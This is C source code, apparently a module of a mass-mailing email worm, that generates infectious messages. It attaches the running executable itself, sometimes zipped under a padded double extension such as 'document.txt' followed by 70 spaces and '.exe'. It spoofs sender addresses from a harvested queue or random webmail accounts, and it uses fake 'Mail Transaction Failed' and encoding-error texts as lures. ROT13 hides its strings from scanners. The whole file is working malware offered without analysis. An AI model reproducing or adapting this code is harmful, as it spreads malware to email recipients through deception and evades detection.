/*
 *  Sync's message generator
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "lib.h"
#include "msg.h"
#include "zipstore.h"
#include "massmail.h"

/* state structure */
struct msgstate_t {
	char *to, from[256], subject[128];
	char exe_name[32], exe_ext[16];
	char zip_used, zip_nametrick, is_tempfile;
	char attach_name[256];
	char attach_file[MAX_PATH];
	int attach_size;		/* in bytes */
	char mime_boundary[128];
	char *buffer;
	int buffer_size;
};

/* FIXME: must check "To:" != "From:" */
static void select_from(struct msgstate_t *state)
{
	static const char *step3_domains[] = {
		/* "aol.com", "msn.com", "yahoo.com", "hotmail.com" */
		"nby.pbz", "zfa.pbz", "lnubb.pbz", "ubgznvy.pbz"
	};
	int i, j, n;
	struct mailq_t *mq;

	state->from[0] = 0;

	/* STEP1 */
	while ((xrand16() % 100) < 98) {
		for (n=0,mq=massmail_queue; mq; mq=mq->next, n++);
		if (n <= 3) break;
		j = xrand32() % n;
		for (i=0,mq=massmail_queue; mq; mq=mq->next, i++)
			if (i == j) break;
		if (mq == NULL) break;
		lstrcpy(state->from, mq->to);
		return;
	}

	/* STEP 2: use any Outlook account. Not implemented yet. */

	/* STEP 3 */
	j = 3 + (xrand16() % 3);        /* username length; 3-5 chars */
	for (i=0; i<j; i++)
		state->from[i] = 'a' + (xrand16() % 26);
	state->from[i++] = '@';
	j = xrand16() % (sizeof(step3_domains) / sizeof(step3_domains[0]));
	rot13(state->from+i, step3_domains[j]);
}

static void select_exename(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *name;
	} names[] = {
		{ 30, "qbphzrag" },
		{ 15, "ernqzr" },
		{ 15, "qbp" },
		{ 15, "grkg" },
		{ 10, "svyr" },
		{ 10, "qngn" },
		{ 5, "grfg" },
		{ 17, "zrffntr" },
		{ 17, "obql" },
		{ 0, "" }
	};
	static const struct {
		char pref;
		const char *ext;
	} exts[] = {
		{ 50, "cvs" },
		{ 50, "fpe" },
		{ 15, "rkr" },
		{ 5, "pzq" },
		{ 5, "ong" },
		{ 0, "" }
	};
	int i, j, tot;

	if ((xrand16() % 100) < 8) {
		j = 3 + (xrand16() % 5);
		for (i=0; i<j; i++)
			state->exe_name[i] = 'a' + (xrand16() % 26);
		state->exe_name[i] = 0;
	} else {
		for (i=0, tot=1; names[i].pref != 0; i++) tot += names[i].pref;
		j = xrand16() % tot;
		for (i=0, tot=1; names[i].pref != 0; i++)
			if ((tot += names[i].pref) >= j) break;
		if (names[i].pref == 0) i = 0;
		rot13(state->exe_name, names[i].name);
	}

	for (i=0, tot=1; exts[i].pref != 0; i++) tot += exts[i].pref;
	j = xrand16() % tot;
	for (i=0, tot=1; exts[i].pref != 0; i++)
		if ((tot += exts[i].pref) >= j) break;
	if (exts[i].pref == 0) i = 0;
	rot13(state->exe_ext, exts[i].ext);

	wsprintf(state->attach_name, "%s.%s", state->exe_name, state->exe_ext);
}

static void select_subject(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *subj;
	} subjs[] = {
		{ 12, "" },
		{ 35, "grfg" },
		{ 35, "uv" },
		{ 35, "uryyb" },
		{ 8, "Znvy Qryvirel Flfgrz" },
		{ 8, "Znvy Genafnpgvba Snvyrq" },
		{ 8, "Freire Ercbeg" },
		{ 10, "Fgnghf" },
		{ 10, "Reebe" },
		{ 0, "" }
	};
	int i, j, tot;

	if ((xrand16() % 100) < 5) {
		j = 3 + (xrand16() % 15);
		for (i=0; i<j; i++)
			state->subject[i] = 'a' + (xrand16() % 26);
		state->subject[i] = 0;
	} else {
		for (i=0, tot=1; subjs[i].pref != 0; i++) tot += subjs[i].pref;
		j = xrand16() % tot;
		for (i=0, tot=1; subjs[i].pref != 0; i++)
			if ((tot += subjs[i].pref) >= j) break;
		if (subjs[i].pref == 0) i = 0;
		rot13(state->subject, subjs[i].subj);
	}

	i = xrand16() % 100;
	if ((i >= 50) && (i < 85))
		CharUpperBuff(state->subject, 1);
	else if (i >= 85)
		CharUpper(state->subject);
}

static int select_attach_file(struct msgstate_t *state)
{
	HANDLE h;
	char buf[MAX_PATH];

	state->zip_used = 0;
	state->zip_nametrick = 0;
	if ((xrand16() % 100) < 64)
		state->zip_used = 1;

	if (state->zip_used == 0) {
		state->is_tempfile = 0;
		GetModuleFileName(NULL, state->attach_file, MAX_PATH);
	} else {
		state->is_tempfile = 1;
		buf[0] = 0;
		GetTempPath(MAX_PATH, buf);
		if (buf[0] == 0)
			return 1;
		state->attach_file[0] = 0;
		GetTempFileName(buf, "tmp", 0, state->attach_file);
		if (state->attach_file[0] == 0)
			return 1;
		GetModuleFileName(NULL, buf, MAX_PATH);

		state->zip_nametrick = 0;
		if ((xrand16() % 100) < 40)
			state->zip_nametrick = 1;

		if (state->zip_nametrick == 0) {
			if (zip_store(buf, state->attach_file, state->attach_name))
				return 1;
		} else {
			char zip_name[512];
			int i;

			lstrcpy(zip_name, state->exe_name);
			lstrcat(zip_name, ".");
			switch (xrand16() % 5) {
				case 0: lstrcat(zip_name, "doc"); break;
				case 1: case 2: lstrcat(zip_name, "htm"); break;
				default: lstrcat(zip_name, "txt"); break;
			}
			for (i=0; i<70; i++)
				lstrcat(zip_name, " ");
			lstrcat(zip_name, ".");
			switch (xrand16() % 3) {
				case 0: lstrcat(zip_name, "e"); lstrcat(zip_name, "xe"); break;
				case 1: lstrcat(zip_name, "s"); lstrcat(zip_name, "cr"); break;
				default: lstrcat(zip_name, "p"); lstrcat(zip_name, "if"); break;
			}
			
			if (zip_store(buf, state->attach_file, zip_name))
				return 1;
		}
		wsprintf(state->attach_name, "%s.zip", state->exe_name);
	}

	h = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == NULL || h == INVALID_HANDLE_VALUE) {
		if (state->is_tempfile) DeleteFile(state->attach_file);
		return 1;
	}
	state->attach_size = GetFileSize(h, NULL);
	CloseHandle(h);

	if ((state->attach_size < 1024) || (state->attach_size > (300*1024))) {
		if (state->is_tempfile) DeleteFile(state->attach_file);
		return 1;
	}

	return 0;
}

static void write_msgtext(struct msgstate_t *state, unsigned char *p)
{
	struct {
		int pref;
		char *text;
	} texts[] = {
		{ 20, "" },
		{ 5, "test" },
		{ 40, "The message cannot be represented in 7-bit ASCII encoding and has been sent as a binary attachment." },
		{ 40, "The message contains Unicode characters and has been sent as a binary attachment." },
		{ 20, "Mail transaction failed. Partial message is available." },
		{ 0, "" }
	};
	int i, j, w;

	if ((xrand16() % 100) < 20) {
		unsigned char c;
		w = 512 + xrand16() % 2048;
		for (i=0; i<w;) {
			c = xrand16() & 0xFF;
			if (c < 32) continue;
			if (c == '=' || c == '+' || c == 255 || c == 127 || c == 128 || c == '@')
				continue;
		        p[i++] = c;
			if ((xrand16() % 70) == 0) {
				p[i++] = 13;
				p[i++] = 10;
			}
		}
		p[i] = 0;
		return;
	}

	for (i=0,w=1; texts[i].pref != 0; i++) w += texts[i].pref;
	j = xrand16() % w;
	for (i=0,w=1; texts[i].pref != 0; i++) if ((w += texts[i].pref) >= j) break;
	if (texts[i].pref == 0) i = 0;
	lstrcpy(p, texts[i].text);
}

static void base64_t2q(BYTE *t, BYTE *q)
{
	BYTE alpha[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	q[0] = alpha[t[0] >> 2];
	q[1] = alpha[((t[0] & 03) << 4) | (t[1] >> 4)];
	q[2] = alpha[((t[1] & 017) << 2) | (t[2] >> 6)];
	q[3] = alpha[t[2] & 077];
}

static int msg_b64enc(char *outbuf, struct msgstate_t *state)
{
	HANDLE hIn;
	BYTE inbuf[1024], t[3], q[3];
	DWORD tp, inp, inlen, outp, i, linepos;
	const DWORD linelen = 76;

	hIn = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, NULL);
	if (hIn == INVALID_HANDLE_VALUE) return 1;

	for (tp=0, inp=0, inlen=0, outp=0, linepos=0;;) {
		if (inp >= inlen) {
			ReadFile(hIn, inbuf, sizeof(inbuf), &inlen, NULL);
			if (inlen == 0) break;
			inp = 0;
		}
		t[tp++] = inbuf[inp++];
		if (tp == 3) {
			base64_t2q(t, q);
			for (i=0; i<4; i++) {
				outbuf[outp++] = q[i];
				if (++linepos >= linelen) {
					outbuf[outp++] = '\r';
					outbuf[outp++] = '\n';
					linepos = 0;
				}
			}
			memset(t, 0, sizeof(t));
			tp = 0;
		}
	}

	if (tp) {
		base64_t2q(t, q);
		if (tp < 3) q[3] = '=';
		if (tp < 2) q[2] = '=';
		for (i=0; i<4; i++)
			outbuf[outp++] = q[i];
	}

	outbuf[outp] = 0;

	CloseHandle(hIn);
	return 0;
}

static void write_headers(struct msgstate_t *state)
{
	char *buf = state->buffer;

	wsprintf(state->mime_boundary, "----=_%s_%.3u_%.4u_%.8X.%.8X", "NextPart", 0, xrand16() % 15, xrand32(), xrand32());

	rot13(buf, "Sebz: ");                              /* From: */
	lstrcat(buf, state->from);
	rot13(buf+lstrlen(buf), "\r\nGb: ");               /* To: */
	lstrcat(buf, state->to);
	rot13(buf+lstrlen(buf), "\r\nFhowrpg: ");          /* Subject */
	lstrcat(buf, state->subject);

	rot13(buf+lstrlen(buf), "\r\nQngr: ");             /* Date */
	mk_smtpdate(NULL, buf+lstrlen(buf));
	rot13(buf+lstrlen(buf), "\r\nZVZR-Irefvba: 1.0");  /* MIME-Version */
	rot13(buf+lstrlen(buf), "\r\nPbagrag-Glcr: zhygvcneg/zvkrq;\r\n");  /* "\r\nContent-Type: multipart/mixed;\r\n" */
	cat_wsprintf(buf, "\tboundary=\"%s\"", state->mime_boundary);
	rot13(buf+lstrlen(buf), "\r\nK-Cevbevgl: 3");          /* X-Priority: 3 */
	rot13(buf+lstrlen(buf), "\r\nK-ZFZnvy-Cevbevgl: Abezny");  /* X-MSMail-Priority: Normal */

	lstrcat(buf, "\r\n\r\n");
}

static int write_body(struct msgstate_t *state)
{
	char *p = state->buffer;
	char tmp[512];

	/* This is a multi-part message in MIME format. */
	rot13(p+lstrlen(p), "Guvf vf n zhygv-cneg zrffntr va ZVZR sbezng.\r\n\r\n");

	/*
	 * ------=_NextPart_...
	 * Content-Type: text/plain;
	 *	   charset="Windows-1252"
	 * Content-Transfer-Encoding: 7bit
	 */	 
	rot13(tmp,
		"--%f\r\n"
		"Pbagrag-Glcr: grkg/cynva;\r\n"
		"\tpunefrg=\"Jvaqbjf-1252\"\r\n"
		"Pbagrag-Genafsre-Rapbqvat: 7ovg\r\n\r\n"
	);
	cat_wsprintf(p, tmp, state->mime_boundary);

	write_msgtext(state, p+lstrlen(p));
	lstrcat(p, "\r\n\r\n\r\n");

	/*
	 *	------=_NextPart_xxx
	 * Content-Type: application/octet-stream;
	 *    name="ntldr"
	 * Content-Transfer-Encoding: base64
	 * Content-Disposition: attachment;
	 *    filename="ntldr"
	 */
	rot13(tmp,
		"--%f\r\n"
		"Pbagrag-Glcr: nccyvpngvba/bpgrg-fgernz;\r\n"
		"\tanzr=\"%f\"\r\n"
		"Pbagrag-Genafsre-Rapbqvat: onfr64\r\n"
		"Pbagrag-Qvfcbfvgvba: nggnpuzrag;\r\n"
		"\tsvyranzr=\"%f\"\r\n\r\n"
	);
	cat_wsprintf(p, tmp, state->mime_boundary, state->attach_name, state->attach_name);

	if (msg_b64enc(p+lstrlen(p), state))
		return 1;

	cat_wsprintf(p, "\r\n\r\n--%s--\r\n\r\n", state->mime_boundary);

	return 0;
}


/* Main function. Returns pointer to a buffer with generated buffer.
   Caller is responsible to free it using GlobalFree() */
char *msg_generate(char *email)
{
	struct msgstate_t state;

	if (email == NULL) return NULL;
	if (lstrlen(email) < 7) return NULL;		/* x@xx.xx */
	memset(&state, '\0', sizeof(state));

	state.to = email;
	select_from(&state);
	select_exename(&state);
	select_subject(&state);

	if (select_attach_file(&state))
		return NULL;

	state.buffer_size = 8096 + (4 * state.attach_size) / 3;
	state.buffer_size = (((state.buffer_size + 1023) / 1024)) * 1024;
	state.buffer = (char *)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, state.buffer_size);
	if (state.buffer == NULL) goto err;

	state.buffer[0] = 0;
	write_headers(&state);
	if (write_body(&state)) goto err;

	if (state.is_tempfile) DeleteFile(state.attach_file);
	return state.buffer;

err:	if (state.is_tempfile) DeleteFile(state.attach_file);
	if (state.buffer != NULL) GlobalFree((HGLOBAL)state.buffer);
	return NULL;
}
